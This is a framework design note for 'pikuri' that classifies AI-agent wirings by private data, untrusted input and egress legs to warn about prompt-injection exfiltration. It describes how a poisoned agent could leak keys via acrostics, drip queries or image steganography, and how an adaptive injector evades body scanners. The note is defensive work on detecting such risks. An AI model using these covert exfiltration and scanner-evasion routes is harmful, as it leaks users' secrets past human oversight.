**pikuri-computer** (parent reads attacker email on day 1) but pessimistic
for **pikuri-assistant** (architected to keep the parent pristine, untrusted
reaching it only as sub-agent summaries). A `poisoned: true|false` flag
could make the two analyses differ.

Lead worth examining before adding any flag: **this axis may already be the
`untrusted` vs `untrusted_weakened` strength**, not a new flag. A parent
holding *hard* `:untrusted` (reads attacker content directly) is
"poisoned-capable"; one holding only `:untrusted_weakened` (untrusted via a
sub-agent) is "resists poisoning." If so, the soft/loud split *already*
encodes poisoned-vs-pristine and a separate `poisoned` flag would be
redundant. Unverified — the job for future-me is to check whether that
mapping holds in every case or whether there's a scenario the strength
lattice can't express. Only add the flag if the mapping breaks.

There's also a **runtime** side to "poisoned": a `Sanitizer` fail-close on
LLM-*authored* outbound content (`ComposeGuard`'s body reject) is a live
signal the agent *is* poisoned right now, not just poisoned-capable — and
today that signal is misrouted to the LLM instead of the human. Spun out
to [`injection-tripwire.md`](injection-tripwire.md).

### (b) A graded egress axis — the load-bearing route to a "trifecta-soft" pikuri-computer

Reopened from the earlier lean-against: a flat "human-gated ⇒ soft" would
repeat the trust-the-approver mistake, but a *graded* egress axis does not,
and it's the only honest way to classify pikuri-computer as anything better
than a full hard trifecta. Folded in as the working design (still
design-stage — no code):

**Egress strength lattice** (danger order, union = max, most-dangerous
wins):

```
none  <  egress_human_approver  <  egress   (autonomous)
```

> **Amended 2026-08-09 (item 7).** This lattice was first written with a
> third rung, `egress_human_author < egress_human_approver`, for a seat where
> the human types the outbound bytes from scratch. **Dropped** — not
> deferred: the bullet defining it already conceded it "breaks the egress leg
> for exfil, effectively `none`", and a rung definitionally equal to the
> bottom rung is not a rung. Such a seat declares `egress: :none`. See item 7.

- **`:egress_human_approver`** — the LLM drafts, the human inspects a
  pre-fill and commits. Raises the bar (kills silent, high-bandwidth exfil)
  but leaves the covert/drip channel — the "large reduction, not 'any'"
  bound. One notch below autonomous.
- **`:egress`** — autonomous send, no human in the path.

**2-D verdict grid** (`:private` assumed present; else nothing fires):

| egress ↓ / untrusted → | hard | weakened |
|---|---|---|
| autonomous | **loud** | soft |
| human_approver | **soft** | soft |

The grid is monotone in *both* legs — the earlier "must attenuate the leg
that actually carries the exploit" claim, made concrete. It revises last
turn's "pikuri-computer stays loud": with the `human_approver` level
introduced, **pikuri-computer `--no-internet` = `{private,
untrusted(hard), egress_human_approver}` → soft, not loud** — genuinely
safer than an autonomous-egress build, but **not silent** (hard untrusted =
live injection vector; the pre-filled compose is rubber-stampable). So the
user is right that it softens; the correction is soft, not safe. *(Both
routes to silent this paragraph originally named are wrong, and item 7
retired them: author-mode compose is unreachable for a drafting seat, and
privilege-separating the mail read lands on `{weakened, approver}` — still
soft. **Silent needs a leg gone**, which is exactly the default Thunderbird
`Extension` row of the revised table: `allow_` flags off, no egress leg at
all.)* *(Scope note, settled by item 1:
the **default** mode reads the same. `RESEARCHER`'s hard `fetch` is capped
at `approver` by the gated delegation, because that persona holds no
`:private` of its own — so the internet toggle changes how many
approver-gated legs exist, not the verdict.)*

#### What separates `human_approver` from autonomous: payload visibility

The axis above says *who authors the bytes*, which is enough to place
compose but **not** enough to place a confirmer-gated tool — and getting
that wrong deletes the alarm. `Code::Bash` consults its `Confirmer` before
every command (`bash.rb:199`), and there is a `passive_detector` auto-gate
seam that can answer before the human is asked at all. So the naive reading
— *a human is in the path ⇒ `human_approver` ⇒ soft* — makes bash soft too,
and with it **every loud verdict in the repo**: pikuri-code over a private
repo, pikuri-computer in both modes. A detector whose top level is
unreachable is exactly as useless as one that always fires.

The tempting rescue is frequency/salience: bash confirmations come by the
dozen and get rubber-stamped, a compose window is rare and irreversible.
**Inadmissible** — that is attention quality, i.e. the same
effectiveness question that bars scanners from promoting the seat (see
"Scanners must not promote the approver seat" below). Grade attention and
trust-the-approver is back at a finer grain.

The admissible test is structural:

> **Does the human see the bytes that leave, or only a proxy for them?**

- **Compose window → `egress_human_approver`.** The payload *is* the
  reviewed artifact: what is on screen is what egresses, byte for byte.
- **`agent` with `editable: true` → `egress_human_approver`** (author if
  actually retyped). The task string *is* the bytes crossing into the
  egress-holder's reach.
- **Bash behind a confirmer → stays hard `:egress`.** The human approves a
  *command* — a **program**, not a payload. Behind a pipe, a heredoc, a
  script file, `$(…)`, the egressing bytes are computed at runtime and were
  never on screen. Approving `curl` approves an *intent*.
- **A mail attachment → hard `:egress`** (hypothetical — pikuri-thunderbird
  ships none, see below). A key in a `.png`'s low bits is invisible to any
  reader; the human approves a *filename* and a thumbnail. Structurally
  identical to `curl`: an approved **reference** to bytes nobody saw.

This is derived from structure, not from trusting anyone's diligence, and
it is the rule a tool author can actually apply to self-tag — which the
lattice otherwise lacks (`Sandbox#egress?`'s "ask the object for its
posture" needs a question the object can answer).

Consequence for the dry-run: pikuri-code **stays loud** (bash is genuine
autonomous-payload egress with a human blessing the wrapper) while the
Thunderbird/researcher seats drop to **soft**. That is the contrast
finding #2 was asking for — see the revised table under "Results".

**Do not merge this with `:egress_searchengine`.** Write-only grades
*attacker readability of the response*; payload visibility grades *what
the human saw*. Genuinely orthogonal — a readable human-gated egress and a
blind autonomous one are different animals. The 2-D (untrusted × egress)
grid stays 2-D; nobody builds the third axis while write-only is still
unreachable for want of a search-only persona.

#### The attachment corollary: constrain the surface, not just the seat

*Graduated 2026-08-08 — the invariant ("the outbound surface may contain
only fields whose rendering is their content") and its derivation live in
`pikuri-thunderbird/DESIGN.md` §"Why no attachments", the CLAUDE.md
Thunderbird seam, and the grep tripwire there. Enforced by construction:
`MailtoUri`'s five-parameter allowlist, no `ATTACH` in `IcsEvent`.*

What stays here is the detector-side consequence, still unbuilt: an egress
tool's level is not a fixed property of the tool, it's a property of its
**current field set** — so read the level from the tool, never from a table
keyed on tool name. Open item 2 adds the other half (it also depends on the
tool's runtime gate).

#### Bandwidth is not a safety property (the entropy table)

*Graduated 2026-08-08. The argument — the entropy floor, the transcription
price that a tool-less agent actually pays, the drip across many short
queries, and the "don't offer it as reassurance" consequence — is now
taught in `book/07-os-assistant.md` §"Why 'too big to hide' is not a
defense" and stated for the mail seat in `pikuri-thunderbird/DESIGN.md`.
The same pass softened ch7's two "forces a conspicuous blob" claims, which
were the reassurance this section forbids.*

*Corrected while graduating: the original table priced every secret at its
**entropy**, which assumes the agent can pack a key into an optimal
acrostic — bit-level base conversion, which an LLM does badly. The price an
agent can actually pay is **transcription** of the secret's on-disk
characters (~400 words for an `id_ed25519`, ~1600 for an RSA PEM). Which
one applies is a property of the wiring: local compute reaches the floor,
and a network-severed sandbox still computes. The conclusion is unchanged —
the drip removes the ceiling either way.*

What stays here is the detector-side consequence, still unbuilt: **don't
encode bandwidth in the detector.** It's a degree, like scanner strength —
same reason, same answer. Attachments are in scope because they're
*structural*; stego capacity is not.

#### Scanners must not promote the approver seat

*Graduated 2026-08-08. The three shipped scanners — `ComposeGuard`'s
recipient-novelty warn, the `Sanitizer` body fail-close, and
`#body_blob_note` — are documented at their own yardoc (plus
`D-blob-spotter-alphabets` for the alphabet fork), and what they fail to
close lives in `pikuri-thunderbird/DESIGN.md` §"What the body guards do
**not** close": the **ladder** an adaptive injector walks down (control
bytes → plain ASCII → hex/base32 → sub-threshold chunks → linguistic
stego), and the reply-to-injector bypass (the poisoning message's
From-domain is already in Gloda's identity graph, which counts received
mail).*

What stays here is the detector rule, still unbuilt:

> **Scanners must never promote the approver seat.**

Scanner *effectiveness* ("does it catch the acrostic?") is precisely the
data-flow question the detector refuses to answer; grading approver-quality
by scanner strength relaunches trust-the-approver at a finer grain, and
would lull users into trusting a screen that demonstrably misses linguistic
stego. The detector grades the **structural** egress class (who authors the
bytes); scanners live on the **confirmer** as runtime hardening, documented
as bound-not-closed. (Same argument as the frequency/salience rejection
under "payload visibility" — attention quality and scanner strength are one
axis, and the detector declines to grade it.)

*Simplified 2026-08-09 by item 7. This rule was originally "never promote
`human_approver` → `human_author`", and needed a sentence explaining why
author-mode alone may reach `info` — clean-by-construction being a proof
rather than a mitigation-of-degree. With `egress_human_author` dropped, the
rule loses its exception: there is nowhere to promote the seat **to**.
`human_approver` is the best an egress leg gets, and the only thing better
is not holding the leg.*

#### Was: is strict author-mode even reachable? — ANSWERED (no, and it isn't a level)

*Kept as the derivation. Item 7 answers the question this section poses, and
then dissolves it: the seat is unreachable for any drafting chrome, and where
it **is** reachable it is leg-absence rather than a weak leg. The `info` cells
below are gone with the row that held them.*

The grid rests `info` entirely on `egress_human_author` = "the human
types the outbound bytes from scratch, no pre-fill." But **every real UX
wants to pre-fill something** — a blank compose window when the LLM
already knows the recipient and gist is hostile ergonomics, so the
product pressure is always toward pre-fill, and the moment it pre-fills we
are back at `human_approver`. So the clean-by-construction proof may name
a seat that no shippable chrome actually offers. Open questions for the
revisit: is there a *partial* author-mode that keeps the proof (e.g.
pre-fill the recipient + subject — the parts the human can verify at a
glance — but force the human to type the **body** blind, since the body is
the exfil channel)? Or is "author-mode" honest only as a spec-level ideal,
and every real Thunderbird/terminal seat is `human_approver` with the
scanners doing what they can? If the latter, the grid's `info` cells are
aspirational and `soft` is the best any *built* thing gets — worth saying
plainly rather than implying a wiring exists that reaches `info`.

*Continued in review item 7 below, which argues the framing here blames the
wrong thing: pre-fill is a symptom, **drafting** is the blocker, and the
answer is therefore per-seat rather than global.*

## Open items from the 2026-08-08 review pass

Raised by reading the note against the actual wiring after the graded-egress
fold-in. Item 5 was **ship-blocking for v1** — the one rule set the
implementer would otherwise have to invent. **All seven are now closed**
(2026-08-08 / 2026-08-09) and kept below as their derivations.

Both of the last two were filed as "sharpenings that change what we claim,
not what we build", and both turned out to change the build: item 6 added the
`relabel_inbound` saturation rule, the exhaustive-match verdict and the
`Report` shape; item 7 removed a rung from the egress lattice. Amendments
folded back into item 5 and into (b).

### 1. Does a gated delegation *cap* the propagated egress leg? — RESOLVED: yes, in series

The contradiction that forced this list. v1 said the boundary relabel is
identity for egress ("an egress level survives the boundary at its own
strength"), so `RESEARCHER`'s hard `fetch` propagated up hard and
**pikuri-computer's default mode came out loud**. But the revised dry-run
table wanted soft, on the grounds that the only parent→outside channel is
the *editable task string* — i.e. it silently let the gate attenuate the
propagated leg.

**Resolution: the cap is real, and provable here rather than stipulated.**
Ask what can reach an attacker-readable sink through the researcher path.
The parent writes a task string; the human sees it; it crosses.
`RESEARCHER` then searches and fetches autonomously — but the only
parent-private bytes it holds are the ones in that task string, **because it
has no filesystem** (`add_sub_agent_tool`, no `Workspace`). So even a fully
poisoned researcher can exfiltrate nothing but a string a human already
approved as leaving. The child's hard egress cannot exceed the channel that
feeds it.

> **Series cap.** A parent's propagated egress level =
> `min(delegation-channel level, child's egress level)` — **provided the
> child holds no `:private` leg of its own.** Otherwise the leg propagates
> uncapped.
>
> `min` in series (through a channel), `max` in parallel (legs at one node).

This is a composition rule with a precondition, not a case analysis on
"dangerous" children, so it does not reintroduce the propagation exception
v1's last bullet rejects. The direction asymmetry also stops being
stipulated: the **outbound** path (parent → child, through the gate) takes
the min-cap; the **inbound** path (the child's return value, ungated) is
where `untrusted` attenuates by the instruction/content argument. And it
re-hardens automatically when the delegation isn't gated (item 2).

**The precondition is load-bearing — here is the case that proves it.** Give
the child file tools. The human approves an innocuous task ("summarise
`/etc/foo` and look up related material"); the child then reads private data
*after* the gate and egresses a derivative of bytes the human never saw. The
cap fails silently. Note per-node evaluation does not catch this either: a
child holding `{private, hard egress}` with no untrusted leg never fires on
its own node, so without the precondition the tree would read soft when it
should read loud.

**Consequences.**

- `pikuri-computer` is `{private, untrusted(hard), egress_human_approver}` →
  **soft in both modes**, and the revised dry-run table is restored to that.
- The two reachable egress levels are now enough to classify every built
  wiring — no third rung needed.
- The one hole the cap leaves is the rubber-stamped `y` on a clean laundered
  task, which is what re-prices `:egress_searchengine` (see that section).

### 2. The egress *level* is a property of the wiring — RESOLVED: four clauses, all required

"Read the level from the tool, not from a table keyed on tool name" (the
attachment corollary's field-set half) is right but not sufficient:
`agent(editable: true)` reaches `egress_human_approver` only if its injected
`Confirmer` can actually ask a human, and `--no-confirm` swaps in
`Confirmer::AUTO_APPROVE` (`pikuri-os/bin/pikuri-computer:92`,
`pikuri-os/bin/pikuri-os:85`). Same shape twice more: `--no-sandbox`
un-severs the bash leg the revised table scores as "none", and
`Code::Bash`'s `passive_detector` seam can pre-approve before any human is
asked. Left unfixed, the demos' soft verdicts would survive `--no-confirm`
unchanged — the precise flavour of false reassurance this note exists to
refuse.

**Resolution: a tool's egress leg is `egress_human_approver` iff all four
hold. Fail any one → hard `:egress`.** Each clause is a distinct failure
this review hit; dropping any of them re-opens a hole.

1. **A gate that can block on a human.** A `Confirmer` that asks, or a
   hand-off where a separate human action commits (Thunderbird's Send).
   `AUTO_APPROVE`, a pre-approving `passive_detector`, or no confirmer at
   all → no level. *(This item.)*
2. **Payload visibility.** What is on screen *is* what leaves, byte for
   byte — not a program, not a filename, not a reference. *(Bash stays
   hard: approving `curl` approves an intent.)*
3. **Field-set closure.** Every field of the outbound surface renders
   literally, so the level is read from the tool's current fields and a tool
   can lose it by gaining a feature. *(The attachment corollary.)*
4. **Unconditional.** The property holds when nothing fires — the detector
   reads a seat's *floor*. Scanner-conditional strengthening (the
   warning-gated forced retype) is runtime hardening the docs may credit and
   the classifier may not. *(Item 7; "Scanners must not promote the approver
   seat".)*

So the level is computed from the tool **plus its runtime collaborators**,
at wiring time — the same shape as `:untrusted` for `Bash` (item 4: ask the
sandbox, not the workspace).

**Also record the rejected third rung.** "Gated but only proxy-visible" —
bash-behind-a-confirmer as its own middle level — is the first thing anyone
will propose. It changes no verdict and re-opens trust-the-approver at a
finer grain, so: two levels, no more.

### 3. MCP tools — RESOLVED: `{untrusted, egress}` + an opt-in `private:` per registry entry

Per the MCP-tool bypass seam, MCP tools are raw `RubyLLM::Tool` subclasses
with no pikuri tag surface, yet an MCP server is the archetypal
untrusted+egress leg. v1 said nothing, and silence reads as "no legs" — the
one reading we know is wrong.

**The MCP surface carries `{untrusted, egress}` unconditionally**, by the
same principle item 4 settled: a tool's untrusted tag follows the breadth of
what it can reach, and a trust claim is only allowed where the reachable set
is small enough to vouch for. An MCP server's reachable set is unknown by
construction — the tool list arrives at runtime from a server you didn't
write. That is the `AllowAll` case, not the scoped case.

**`:private` is opt-in, declared per registry entry** (`Registry::StdioEntry`
/ `HttpEntry` gain a `private:` boolean, default false). Sensitivity is as
unknowable to the framework here as it is for a workspace, so the same
asymmetry rule applies: the human registering a Notion server knows; the one
registering OpenLibrary knows too.

**The union is over *registered* servers, not activated ones** — and this is
the non-obvious part, so state it where someone will try to narrow it. An
agent holding the MCP surface can reach **every** registered server, because
`mcp_connect` activates any of them at will. Registration is the capability
boundary; activation is just when the tools show up. So one private server
makes the whole MCP surface private, and the agent is a full trifecta — as
it should be.

**Mid-session arrival is a non-problem** *(verified, and it reverses this
item's original worry)*. `Registry` is **frozen at construction**
(`registry.rb:77–78`), and `mcp_connect` only activates already-registered
entries. So the *tools* arrive after the Configurator block, but the *legs*
cannot: the capability set is fully knowable at boot. "Warn once per
process" survives unchanged — no re-evaluation, no verdict-change keying.

**Worked example, and it is the one in the book.**
`bin/pikuri-openlibrary` wires `CALCULATOR` plus the MCP extension and no
filesystem at all → `{untrusted, egress}`, two legs → **silent**. Correct,
and a useful contrast to keep: the same MCP surface next to a private pool
would be loud, and nothing about the MCP wiring would have changed.

### 4. Local-file-read `:untrusted` — RESOLVED: on by default, opt out per scoped root

The tag-table-vs-narrative gap parked at the top of this file, and
ship-blocking because every dry-run verdict depended on the answer. Under
the tag table as literally written, pikuri-code over a private repo is
`{private, egress}` → silent, contradicting its own dry-run row.

**Resolution (2026-08-08): file reads carry hard `:untrusted` by default.**
Broad disk access means Downloads, browser and package caches, cloned
dependencies, fetched PR branches — attacker-authored bytes are the norm,
not the exception, and a hostile README is read into the model's context
verbatim. This is the untrusted-leg twin of tag-egress-generously.

**The opt-out is a property of the workspace *root*, not of paths.** The
tempting version — mark trusted islands inside a broad workspace — buys
nothing here, because the detector reasons about capability presence: if
`Read` can reach `~/Downloads` **at all**, `Read` is untrusted, however many
subfolders were vouched for. Trust only lowers the tag when the trusted area
is the tool's *entire reachable set*. So an island **is** a scoped
workspace, and pikuri already has the distinction in the type system:

- `Filesystem.new(project_root:, readable:, writable:)` — scoped;
  `trusted: true` is meaningful.
- `Filesystem::AllowAll` — whole host minus a denylist; `trusted:` must be
  **rejected in the constructor** (`ArgumentError`, per errors-are-loud).
  Not merely inadvisable — unrepresentable, because the flag cannot be
  honest there.

No path-matching machinery, no precedence rules, no symlink-escape
question. If a redesign is ever needed it is local to one constructor
argument.

**Bash follows the *sandbox's* fs view, not the workspace's.** Otherwise the
rule fails silently: scope the workspace to a trusted repo, declare it, and
`bash` still `cat`s `~/Downloads`, because `FullFsNoNet` hands the
subprocess the whole filesystem — the workspace governs what the *LLM
observes*, the sandbox governs what *bash sees*. Same "ask the object for
its posture" rule as `Sandbox#egress?`, second axis (item 5 now owes two
predicates, not one).

**Two things this settles that were open elsewhere.**

- **The weakened column is reachable after all.** Earlier worry: with file
  reads untrusted, `untrusted_weakened` survives only for agents with no
  file tools, so the untrusted lattice earns nothing. The opt-out is what
  rescues it — pikuri-code quarantines its web tools in sub-agents, so over
  a **trusted** private repo the parent is
  `{private, egress(hard), untrusted_weakened}` → **soft**. One binary, three
  verdicts: public repo → silent, trusted private repo → soft, untrusted
  private repo → loud. That is the teaching contrast finding 3 was reaching
  for.
- **`trusted:` is not exotic.** pikuri-code's default wiring is already
  scoped (`AllowAll` only under `--yolo`), so the flag is available exactly
  where it is honest and unavailable exactly where claiming it would be a
  lie. The binary also sets the UX precedent: it already asks a *scoped*
  trust question at boot (`pikuri-code:211` — "Trust this directory's git
  config?", default no, with a concrete account of what goes wrong).

  Keep the two questions **separate** if `trusted:` ever gets a prompt. That
  one asks whether a hostile `.gitattributes` diff driver can **execute
  code**; ours asks whether the repo's **bytes** are attacker-authored. A
  repo routinely passes the first and fails the second (you control
  `.git/config`; `vendor/` is someone else's). Merging them would let a
  `yes` about git config silently declare all content trusted — the
  mis-declaration this design otherwise makes impossible.

### 5. The implementation seam — RESOLVED: legs on the tool, computed at construction

What the note owed: where the tags live on `Pikuri::Tool`; how a tool whose
level depends on collaborators exposes it (item 2); two sandbox predicates
that don't exist (nothing in `pikuri-code/lib/pikuri/code/bash/sandbox.rb`
answers posture, so "ask the object" had no receiver); the
`Filesystem(private:, trusted:)` constructor change; when the tree walk
runs; how personas resolve `tool_names` → tools for the sub-agent nodes;
and where the report goes.

**The load-bearing observation that makes the rest fall out: in pikuri,
construction *is* wiring time.** Every collaborator that item 2 says the
level depends on — the `Workspace`, the `Sandbox`, the `Confirmer` — is a
constructor kwarg of the tool that uses it (`Bash.new(filesystem:,
confirmer:, sandbox:, passive_detector:)`, `Read.new(workspace:)`,
`SubAgent::Extension.new(personas:, confirmer:)`). So there is **no separate
resolution pass**: a tool computes its own legs in its constructor and hands
them to `super`. That is what "computed from the tool plus its runtime
collaborators, at wiring time" cashes out to, and it is why the seam is
smaller than item 2 made it sound.

#### (a) Tag storage: a `TrifectaLegs` record on `Pikuri::Tool`

Not a `Set` of symbols. Two of the three axes are graded, so a symbol set
makes `max` awkward and lets a typo (`:egresss`) pass as "no leg" — the
silent-underwarn failure this detector exists to refuse.

```ruby
# pikuri-core/lib/pikuri/tool/trifecta_legs.rb
Pikuri::Tool::TrifectaLegs = Data.define(:private, :untrusted, :egress)
#   private   => true | false
#   untrusted => :none | :weakened | :hard
#   egress    => :none | :human_approver | :autonomous
```

Named in full because the accessor is read at call sites far from this
file: `tool.trifecta_legs` says what it is, `tool.legs` reads as anatomy.
(Inside the tree the field stays `node.legs` — unambiguous in the
`Trifecta::` namespace.)

Three constants, `#|(other)` (per-axis `max` — union at a node), and the
two boundary operations item 1 named: `#relabel_inbound` (`:hard →
:weakened`, **saturating** — see item 6 — private and egress identity) and
`#cap_egress(channel_level)`. The lattices live here and nowhere else, and
`TrifectaLegs` carries no *evaluation*: the verdict lives on
`Trifecta::Report`, because a single tool's legs having a verdict is a
category error (item 6).

`Tool#initialize` gains `trifecta_legs: TrifectaLegs::ASSUMED`, plus
`attr_reader :trifecta_legs`. Every existing constructor keeps working
(loudly, see below); the bundled tools declare at their own definition site:

```ruby
class Workspace::Read < Pikuri::Tool
  def initialize(workspace:)
    fs = workspace.filesystem
    super(name: 'read', ..., trifecta_legs: Pikuri::Tool::TrifectaLegs.new(
      private:   fs.private?,
      untrusted: fs.trusted? ? :none : :hard,   # item 4
      egress:    :none))
```

```ruby
class Code::Bash < Pikuri::Tool
  def initialize(filesystem:, confirmer:, sandbox: Sandbox::NONE, passive_detector: nil)
    super(..., trifecta_legs: Pikuri::Tool::TrifectaLegs.new(
      private:   filesystem.private?,
      untrusted: (sandbox.confined_to_workspace? && filesystem.trusted?) ? :none : :hard,
      egress:    sandbox.egress? ? :autonomous : :none))
```

Note what `Bash` does **not** do: it never claims `:human_approver`, even
though it holds a `Confirmer`. Clause 2 (payload visibility) fails — the
human approves a program, not a payload — so the confirmer is invisible to
the classifier. That is the single most important line of the whole
implementation, because it is what keeps pikuri-code loud, and it is
enforced by the tool author writing one literal rather than by a rule
engine.

**The default is `ASSUMED`, not `NONE` — an undeclared tool is presumed
hostile on every axis the framework could have determined.** Silence from a
tool author is not evidence of safety, and the fix belongs with the vendor
who knows. So:

```ruby
NONE    = new(private: false, untrusted: :none,     egress: :none)
ASSUMED = new(private: false, untrusted: :hard,     egress: :autonomous)
```

**`ASSUMED` stops short of `private: true`, and that boundary is the
asymmetry rule, not a compromise.** `untrusted` and `egress` are the axes
the framework *can* determine, so an undeclared tool means it determined
nothing and worst-case is the honest reading. `private` is the axis where
only the user can know — assuming it makes *every* wiring loud, which kills
"why the default is quiet", strips "loud" of the information the revised
dry-run table just bought it, and gets a warn-only detector muted. That is
not fail-safe, it is fail-to-noise.

The convergence worth noticing: **`ASSUMED` is exactly item 3's MCP
surface** — `{untrusted, egress}` hard with `private:` opt-in per registry
entry — arrived at independently, from the same argument. So item 3 stops
being a special case for foreign tools and becomes the first instance of the
general rule, and `bin/pikuri-openlibrary` stays **silent** as that item
requires rather than firing loud on a calculator.

Consequence for the rollout: every bundled tool must declare, or the demos
go loud for want of a line on `calculator` / `task_*` / `skill`. That is a
**spec** obligation, not a default-value one — each gem's spec asserts its
tools' `trifecta_legs` by value, alongside the step that tags them, and the
detector isn't wired until step 5 anyway.

#### (b) The two sandbox predicates

On `Code::Bash::Sandbox`, alongside `#wrap`, both answered by each sandbox
for itself (module method on `NONE`, instance methods on the two classes):

- **`#egress?`** — can the wrapped command reach a network sink? `NONE` →
  `true`, `Bubblewrap` → `true` (it keeps `--share-net`), `FullFsNoNet` →
  `false`. The `false` is earned by `--unshare-net` **plus**
  `SESSION_IPC_MASKS`; a netns alone would not be evidence (finding 1's
  session-bus correction). A sandbox that ever degrades instead of raising
  must answer `true`.
- **`#confined_to_workspace?`** — does the wrapped command see only the
  workspace? `NONE` → `false`, `Bubblewrap` → `true` (its constructor
  already rejects an unbounded workspace), `FullFsNoNet` → `false`
  (`--dev-bind / /`). This is the fs-view twin item 4 demanded, and the
  name says what the untrusted rule actually needs: not "is it safe" but
  "is the reachable set the one the workspace's `trusted:` claim covers".

Both are conservative at the identity element: the do-nothing sandbox
answers *egresses* and *sees everything*. A downstream host subclassing
`Bubblewrap` (its header invites this) inherits `egress? == true` — wrong in
the safe direction.

#### (c) `Filesystem(private:, trusted:)`, one constructor change

Both flags ride the existing ctor (`private: false, trusted: false`),
exposed as `#private?` / `#trusted?` predicates only — no `attr_reader
:private`, which would read as a visibility call at every call site.
`AllowAll` (already a `Filesystem` subclass) raises `ArgumentError` on
`trusted: true`: unrepresentable, not merely inadvisable. `private:` is
accepted there, since a whole-host workspace is exactly where someone means
it.

MCP is the same shape one level up: `Registry::StdioEntry` / `HttpEntry`
gain `private: false`, and `Registry#private?` is `entries.any?(&:private?)`
— the union over *registered* entries, per item 3.

#### (d) The tree: one node type, one hook

```ruby
Pikuri::Trifecta::Node = Data.define(:label, :tool_legs, :children, :channel_egress)
#   tool_legs => ordered { String tool name => TrifectaLegs }, this node's own tools
```

`channel_egress` is a property of the *edge* to the parent, stored on the
child because every child has exactly one parent edge; it is
`:human_approver` when the delegation is gated and `:autonomous` otherwise,
and it is the `min` argument of item 1's series cap.

**`tool_legs` is a name→legs map, not the live `Tool` objects** — and it
replaces an earlier `legs:` field that held only the union. Two reasons, one
of which was a hole:

- **Attribution needs a receiver.** §5(e) originally said the renderer
  recovers "which tool gave you this leg" by *scanning the node's tools* — but
  `Node` had no tools, so as specified that was unimplementable. Keeping the
  per-tool breakdown makes attribution structural rather than computed: the
  map (§(f)) prints the tools as leaves and the reader sees it.
- **Purity stays hand-buildable.** Carrying real `Tool` instances would mean
  constructing tools — with their workspaces, sandboxes and confirmers — to
  write a spec, which defeats the testing seam. A name and a legs record is
  all either consumer needs.

The node's own union is `tool_legs.values.reduce(:|)`, computed rather than
stored.

Sub-agent nodes and the MCP surface both need something no tool can supply,
so extensions get **one optional hook**:

```ruby
# @param tools [Array<Tool>] agent.tools + agent.sub_agent_tools
# @return [Trifecta::Contribution, nil]  legs this extension adds to *this*
#   node, plus the child nodes it introduces
def trifecta_contribution(tools) = nil
```

- `SubAgent::Extension` answers with one child per persona, resolving
  `tool_names` **the same way `SubAgentTool#execute` does** — `tools.select
  { |t| persona.tool_names.include?(t.name) }`, legs unioned — and sets
  `channel_egress` from its own `@confirmer`. That answers "how do personas
  resolve to tools": they don't, separately; the extension that owns the
  resolution owns the node.
- `Mcp::Extension` answers with no children and
  `legs: TrifectaLegs::ASSUMED.with(private: registry.private?)` — item 3's
  defaults *are* the undeclared-tool default (see (a)), attached at the
  extension because MCP tools are raw `RubyLLM::Tool`s with no leg surface
  (the MCP-tool bypass seam).

Two notes on the hook. It needs a **`respond_to?` guard**, unlike every
other Extension hook — the protocol documents that a class defining all
hooks without including the module is legal, so an unguarded fifth hook
breaks those. Guarded-plus-a-`nil`-default in the module is the honest
version; say so in the protocol doc rather than quietly weakening "the
Agent calls them by name with no guard".

And the gate predicate the hook reads is the confirmer's own: **`Confirmer#blocks_on_human?`**, `true` on the base class, overridden `false`
on `AutoApprove`. Same "ask the object for its posture" rule as the sandbox,
third receiver — and it is what makes `--no-confirm` re-harden the demos'
verdicts automatically, which is the whole point of item 2 clause 1.

#### (e) When the walk runs, and where the report goes

**At the end of `Agent#run_configure`, after the bind sweep** — not at
Configurator close. `bind` is where `ExtensionContext#add_raw_tool` fires
(the `agent` tool itself, MCP's tools), so a Configurator-close walk would
miss exactly the extensions that contribute children. Guarded twice: main
agent only (`@id.empty?`) and once per process (a flag on `Pikuri::Trifecta`
— a host that builds several agents gets one line, per "actionable + once
per process").

`Pikuri::Trifecta.walk(node)` is a **pure function of the node tree**:
fold each child in (private identity, untrusted `relabel_inbound`, egress
`min(channel_egress, child.egress)` unless the child holds `:private`),
union in parallel, and return the **root `Report`, carrying the whole tree**:

```ruby
Report = Data.define(:label, :legs, :tool_legs, :children, :channel_egress)
#   #verdict derived (item 6)
```

- `legs` — folded: this node's own tools unioned with everything propagated
  up from children. What the verdict reads.
- `tool_legs`, `channel_egress` — carried through from the `Node` so the map
  can render leaves and edges (§(f)).
- `#verdict` is per node; `#worst` walks the tree for the max plus its path.

*An `own_legs` field was specified here and then dropped: its sole
justification was making a propagated leg attributable
(`legs - own_legs`), and printing the tools as leaves does that better. A
field whose only consumer found a better route stops earning its place.*

Purity is the testing seam: the paper dry-run's whole results table becomes a
spec over hand-built nodes, with no agent, no LLM and no sandbox probe —
which is the only way the `--no-confirm` and `--no-sandbox` regressions item
2 worries about get covered. With `#render` (below) pure too, the dry-run
table can be asserted as expected *output*, not just as three verdict
symbols.

#### (f) Presentation: the advisory is core's, the map is the host's

Two different artifacts, and fusing them was a mistake worth recording
because it is the obvious design:

- **The advisory** — one line, emitted by core from `run_configure`, **once
  per process, never optional**. It is the safety-critical half: no host may
  forget to wire it, and no host needs to opt in.
- **The map** — the full tree, rendered by whoever has a screen. **Every
  `bin/pikuri-*` prints it, always, with no flag**: the bins exist for
  education (CLAUDE.md already scopes them as "dev / demo entry points only,
  not gem executables"), and anyone doing real work is expected to move to a
  downstream production host, where the same tree sits behind an explicit
  ask — `/trifecta` in a TUI. So "always on" costs a demo user four lines and
  costs a real user nothing.

Consequences of the split:

- **The once-per-process guard belongs to the advisory only.** Putting it on
  the reader would make `/trifecta` work exactly once per session. The reader
  is pure and re-callable.
- **`Agent#trifecta` is required after all** — the reader question parked
  below is answered *yes*, because bin scripts and the TUI cannot render what
  they cannot reach. (Answering it "no, log-only" was the first instinct and
  it is wrong: it forces core to own presentation.)
- **Core logs, hosts print.** The advisory is a diagnostic and goes through
  `Pikuri.logger_for('Trifecta')`; the map is chrome deliberately shown to a
  human, so a bin script prints it like any other boot banner rather than
  routing it through the logger.

**The advisory line.** `warn` for loud, `info` for soft *and for silent* —
deliberately not `error`, which this note reserves for pikuri's own bugs
("this isn't an error, it's an advisory"); a wiring that is loud **by
design**, like `pikuri-code` over a private repo, must not teach users that
ERROR is normal. The severity contrast lives in the text
(`[TRIFECTA: HARD]` / `[TRIFECTA: soft]`), and the renderer reads the **cell**
(`report.legs`), not the verdict symbol, because the three `soft` cells want
three different fixes (item 6).

**The silent line is descriptive, never reassuring** — and this is a rule,
not a wording preference. "No trifecta detected" is a safety claim the
detector is constitutionally unable to make ("smoke alarm, not firewall": it
under-warns on a single tool that is all three internally, and on private
data staged to a file by one tool and read by another). Report the *finding*
instead, which also names what would tip the wiring over:

```
Trifecta: 2 of 3 legs — private, untrusted. No egress leg found.
```

